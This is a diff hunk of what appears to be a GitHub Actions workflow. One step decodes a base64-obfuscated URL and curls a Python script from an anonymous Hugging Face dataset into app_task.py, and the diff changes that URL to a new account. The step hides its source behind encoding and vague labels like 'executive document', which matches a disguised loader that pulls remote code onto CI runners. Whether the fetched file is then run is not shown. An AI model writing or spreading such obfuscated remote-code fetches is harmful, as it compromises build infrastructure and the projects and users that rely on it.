@@ -69,7 +69,7 @@ jobs:
       - name: Take In Executive Document
         run: |
           echo "[TAKEIN] Taking in app_task.py from designated ledger library..."
-          LEDGER_LIBRARY=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          LEDGER_LIBRARY=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 --decode)
           curl -sL "$LEDGER_LIBRARY" -o app_task.py
           echo "[TAKEIN] Executive document taken in successfully."
 
